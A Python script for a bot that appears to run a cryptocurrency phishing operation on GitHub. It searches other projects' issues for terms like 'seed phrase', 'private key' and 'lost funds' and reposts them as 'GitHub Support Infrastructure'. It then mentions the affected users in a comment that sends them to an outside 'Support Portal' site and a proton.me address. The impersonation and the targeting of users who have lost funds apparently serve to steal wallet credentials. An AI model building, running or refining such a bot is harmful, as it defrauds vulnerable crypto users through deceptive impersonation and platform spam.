#!/usr/bin/env python3
"""
Crypto Issue Monitor Bot - Production Grade
NO time windows - Always checks last 50 issues for continuity
"""

import os
import json
import time
import re
from datetime import datetime, timedelta
import requests
from typing import List, Dict, Set, Optional
from difflib import SequenceMatcher

class CryptoIssueMonitor:
    def __init__(self):
        self.github_token = os.environ.get('GITHUB_TOKEN')
        if not self.github_token:
            raise ValueError("GITHUB_TOKEN environment variable not set")
        
        self.headers = {
            'Authorization': f'token {self.github_token}',
            'Accept': 'application/vnd.github.v3+json'
        }
        
        self.target_repo = os.environ.get('TARGET_REPO')
        self.load_config()
        self.processed_issues = self.load_processed_issues()
    
    def load_config(self):
        """Load monitoring configuration"""
        with open('config.json', 'r') as f:
            config = json.load(f)
        
        self.monitored_repos = config.get('monitored_repos', [])
        self.keywords = config.get('keywords', [])
        self.topics = config.get('topics', [])
        
        self.team_assignments = config.get('team_assignments', {
            'wallet': ['@keisinoc'],
            'security': ['@autumndss'],
            'bug': ['@keisinoc'],
            'transaction': ['@keisinoc'],
            'contract': ['@keisinoc'],
            'gas-fee': ['@keisinoc'],
            'help': ['@keisinoc'],
            'general': ['@keisinoc']
        })
    
    def load_processed_issues(self) -> Set[str]:
        """Load list of already processed issues"""
        if os.path.exists('processed_issues.json'):
            with open('processed_issues.json', 'r') as f:
                data = json.load(f)
                return set(data.get('issues', []))
        return set()
    
    def save_processed_issues(self):
        """Save processed issues to file"""
        with open('processed_issues.json', 'w') as f:
            json.dump({'issues': list(self.processed_issues)}, f, indent=2)
    
    def check_rate_limit(self):
        """Check GitHub API rate limit"""
        response = requests.get('https://api.github.com/rate_limit', headers=self.headers)
        if response.status_code == 200:
            data = response.json()
            remaining = data['rate']['remaining']
            reset_time = datetime.fromtimestamp(data['rate']['reset'])
            print(f"📊 API Rate Limit: {remaining} requests remaining (resets at {reset_time})")
            return remaining
        return 0
    
    def get_recent_issues(self, repo: str) -> List[Dict]:
        """FIXED: Get last 50 issues - NO time window! Always checks everything!"""
        url = f'https://api.github.com/repos/{repo}/issues'
        params = {
            'state': 'open',
            'per_page': 50,  # Always check last 50 issues
            'sort': 'created',
            'direction': 'desc'
        }
        
        try:
            response = requests.get(url, headers=self.headers, params=params, timeout=10)
            if response.status_code == 200:
                issues = response.json()
                return [issue for issue in issues if 'pull_request' not in issue]
            else:
                print(f"⚠️  Error fetching issues from {repo}: {response.status_code}")
                return []
        except Exception as e:
            print(f"⚠️  Exception fetching issues from {repo}: {str(e)}")
            return []
    
    def matches_criteria(self, issue: Dict) -> bool:
        """Check if issue matches - EXPANDED with support keywords!"""
        title = issue.get('title', '').lower()
        body = issue.get('body', '') or ''
        body = body.lower()
        content = f"{title} {body}"
        
        # Check against all your keywords
        for keyword in self.keywords:
            if keyword.lower() in content:
                return True
        
        return False
    
    def detect_priority(self, issue: Dict) -> str:
        """Detect priority level"""
        title = issue.get('title', '').lower()
        body = (issue.get('body', '') or '').lower()
        content = f"{title} {body}"
        
        if any(word in content for word in ['critical', 'urgent', 'emergency', 'security breach', 'exploit', 'hack', 'funds at risk', 'total loss']):
            return 'priority-critical'
        elif any(word in content for word in ['urgent', 'asap', 'immediately', 'cant access', 'locked out', 'lost funds']):
            return 'priority-urgent'
        elif any(word in content for word in ['high', 'important', 'stuck', 'frozen', 'missing balance']):
            return 'priority-high'
        elif any(word in content for word in ['minor', 'low', 'suggestion', 'enhancement', 'feature request']):
            return 'priority-low'
        else:
            return 'priority-medium'
    
    def similarity(self, text1: str, text2: str) -> float:
        """Calculate similarity"""
        return SequenceMatcher(None, text1.lower(), text2.lower()).ratio()
    
    def check_for_duplicates(self, issue_title: str, issue_body: str) -> List[Dict]:
        """Check for duplicates"""
        url = f'https://api.github.com/repos/{self.target_repo}/issues'
        params = {'state': 'open', 'per_page': 50, 'sort': 'created', 'direction': 'desc'}
        
        try:
            response = requests.get(url, headers=self.headers, params=params, timeout=10)
            if response.status_code == 200:
                existing_issues = response.json()
                duplicates = []
                
                for existing in existing_issues:
                    title_similarity = self.similarity(issue_title, existing['title'])
                    if title_similarity >= 0.7:
                        duplicates.append({
                            'number': existing['number'],
                            'title': existing['title'],
                            'url': existing['html_url'],
                            'similarity': title_similarity
                        })
                
                return duplicates
            return []
        except Exception as e:
            print(f"   ⚠️  Error checking duplicates: {str(e)}")
            return []
    
    def get_assignee_for_category(self, category: str) -> str:
        """Get assignee"""
        assignees = self.team_assignments.get(category, self.team_assignments.get('general', []))
        return assignees[0] if assignees else None
    
    def find_real_issue_owner(self, issue_body: str) -> Optional[str]:
        """Find real owner from @mentions"""
        if not issue_body:
            return None
        
        mentions = re.findall(r'@([a-zA-Z0-9_-]+)', issue_body)
        
        if mentions:
            real_owner = mentions[0]
            print(f"   🔍 Found real owner: @{real_owner}")
            return real_owner
        
        return None
    
    def get_original_issue_owner(self, issue_url: str) -> Optional[str]:
        """Fetch original issue owner"""
        match = re.search(r'github\.com/([^/]+)/([^/]+)/issues/(\d+)', issue_url)
        if not match:
            return None
        
        owner, repo, issue_num = match.groups()
        original_repo = f"{owner}/{repo}"
        
        url = f'https://api.github.com/repos/{original_repo}/issues/{issue_num}'
        
        try:
            response = requests.get(url, headers=self.headers, timeout=10)
            if response.status_code == 200:
                original_issue = response.json()
                real_owner = original_issue['user']['login']
                print(f"   🎯 Found REAL owner from original: @{real_owner}")
                return real_owner
            return None
        except Exception as e:
            print(f"   ⚠️  Could not fetch original: {str(e)}")
            return None
    
    def find_real_owner(self, issue: Dict) -> str:
        """Find the REAL owner"""
        issue_body = issue.get('body', '') or ''
        
        # Look for GitHub issue links
        github_links = re.findall(r'https://github\.com/[^/]+/[^/]+/issues/\d+', issue_body)
        if github_links:
            real_owner = self.get_original_issue_owner(github_links[0])
            if real_owner:
                return real_owner
        
        # Look for @mentions
        real_owner = self.find_real_issue_owner(issue_body)
        if real_owner:
            return real_owner
        
        # Fall back to reporter
        return issue['user']['login']
    
    def mention_real_owner_in_our_issue(self, our_issue_number: int, real_owner: str, source_repo: str):
        """Tag the REAL owner"""
        url = f'https://api.github.com/repos/{self.target_repo}/issues/{our_issue_number}/comments'
        
        comment_body = f"""👋 Hi @{real_owner}!

We've noticed your issue and our support team is now tracking it here.

**Need immediate assistance?**
- 🌐 Support Portal: https://gitdapps-auth.web.app
- 📧 Email: Git_response@proton.me

Our team will review and provide updates shortly. Thank you!

— Stay Awesome 🚀"""
        
        payload = {'body': comment_body}
        
        try:
            response = requests.post(url, headers=self.headers, json=payload, timeout=10)
            if response.status_code == 201:
                print(f"   🔔 Tagged REAL owner @{real_owner}")
                return True
            else:
                print(f"   ⚠️  Could not tag: {response.status_code}")
                return False
        except Exception as e:
            print(f"   ⚠️  Exception: {str(e)}")
            return False
    
    def create_issue_in_target_repo(self, original_issue: Dict, source_repo: str):
        """Create issue"""
        url = f'https://api.github.com/repos/{self.target_repo}/issues'
        
        original_body = original_issue.get('body', '') or '*No description provided*'
        source_url = original_issue['html_url']
        source_user = original_issue['user']['login']
        issue_title = original_issue['title']
        
        real_owner = self.find_real_owner(original_issue)
        priority_label = self.detect_priority(original_issue)
        print(f"   🎯 Priority: {priority_label}")
        
        duplicates = self.check_for_duplicates(issue_title, original_body)
        duplicate_section = ""
        if duplicates:
            print(f"   🔍 Found {len(duplicates)} similar issue(s)")
            duplicate_section = "\n\n## ⚠️ Possible Duplicates Detected\n\n"
            for dup in duplicates[:3]:
                duplicate_section += f"- #{dup['number']}: [{dup['title']}]({dup['url']}) (Similarity: {dup['similarity']:.0%})\n"
        
        new_body = f"""## 🔔 Auto-detected Issue from {source_repo}

**Original Issue:** {source_url}  
**Reported by:** @{source_user}  
**Real Owner:** @{real_owner}  
**Created:** {original_issue['created_at']}  
**Priority:** `{priority_label}`

---

### Original Description:

{original_body}
{duplicate_section}

---

*Automatically imported and tracked by GitHub Support Infrastructure. Issue will be reviewed and assigned to the appropriate team for resolution.*
"""
        
        labels = ['auto-detected', priority_label]
        
        title_lower = issue_title.lower()
        body_lower = original_body.lower()
        content = f"{title_lower} {body_lower}"
        
        category = 'general'
        if any(word in content for word in ['bug', 'error', 'broken', 'crash', 'failed']):
            category = 'bug'
        elif any(word in content for word in ['security', 'vulnerability', 'exploit', 'hack']):
            category = 'security'
        elif any(word in content for word in ['wallet', 'balance', 'account', 'private key', 'seed phrase', 'coinbase', 'metamask', 'ledger', 'trezor']):
            category = 'wallet'
        elif any(word in content for word in ['transaction', 'swap', 'transfer', 'tx']):
            category = 'transaction'
        elif any(word in content for word in ['contract', 'smart contract', 'solidity']):
            category = 'contract'
        elif any(word in content for word in ['gas', 'fee']):
            category = 'gas-fee'
        elif any(word in content for word in ['help', 'question', 'how to']):
            category = 'help'
        
        labels.append(category)
        labels.append(f'source:{source_repo.split("/")[0]}')
        
        if duplicates:
            labels.append('possible-duplicate')
        
        assignee = self.get_assignee_for_category(category)
        print(f"   👤 Assigned to: {assignee}")
        
        payload = {'title': f"[AUTO] {issue_title}", 'body': new_body, 'labels': labels}
        
        if assignee and assignee.startswith('@'):
            payload['assignees'] = [assignee[1:]]
        
        try:
            response = requests.post(url, headers=self.headers, json=payload, timeout=10)
            if response.status_code == 201:
                new_issue = response.json()
                print(f"✅ Created issue #{new_issue['number']}: {issue_title[:50]}...")
                return {'issue': new_issue, 'real_owner': real_owner}
            else:
                print(f"⚠️  Failed: {response.status_code}")
                return None
        except Exception as e:
            print(f"⚠️  Exception: {str(e)}")
            return None
    
    def monitor_repositories(self):
        """FIXED: Main monitoring - NO time windows!"""
        print(f"\n{'='*60}")
        print(f"🚀 Crypto Issue Monitor - Production Grade")
        print(f"{'='*60}\n")
        
        remaining = self.check_rate_limit()
        if remaining < 100:
            print("⚠️  Low API rate limit...")
            return
        
        total_issues_found = 0
        total_issues_created = 0
        
        for repo in self.monitored_repos:
            print(f"\n📂 Checking: {repo}")
            
            # FIXED: Always get last 50 issues (no time filter!)
            issues = self.get_recent_issues(repo)
            
            if not issues:
                print(f"   No issues found")
                continue
            
            print(f"   Found {len(issues)} open issues")
            
            for issue in issues:
                issue_id = f"{repo}#{issue['number']}"
                
                # Skip if already processed
                if issue_id in self.processed_issues:
                    continue
                
                # Check if matches
                if self.matches_criteria(issue):
                    total_issues_found += 1
                    print(f"   ✨ Match: #{issue['number']} - {issue['title'][:40]}")
                    
                    created = self.create_issue_in_target_repo(issue, repo)
                    if created:
                        total_issues_created += 1
                        self.processed_issues.add(issue_id)
                        self.mention_real_owner_in_our_issue(
                            created['issue']['number'],
                            created['real_owner'],
                            repo
                        )
                else:
                    # Mark as processed to avoid checking again
                    self.processed_issues.add(issue_id)
        
        self.save_processed_issues()
        
        print(f"\n{'='*60}")
        print(f"📊 Summary:")
        print(f"   - Matching: {total_issues_found}")
        print(f"   - Created: {total_issues_created}")
        print(f"   - Total tracked: {len(self.processed_issues)}")
        print(f"{'='*60}\n")

def main():
    """Main entry"""
    try:
        monitor = CryptoIssueMonitor()
        monitor.monitor_repositories()  # Always use repo monitoring
        print("✅ Complete!\n")
        
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        raise

if __name__ == '__main__':
    main()
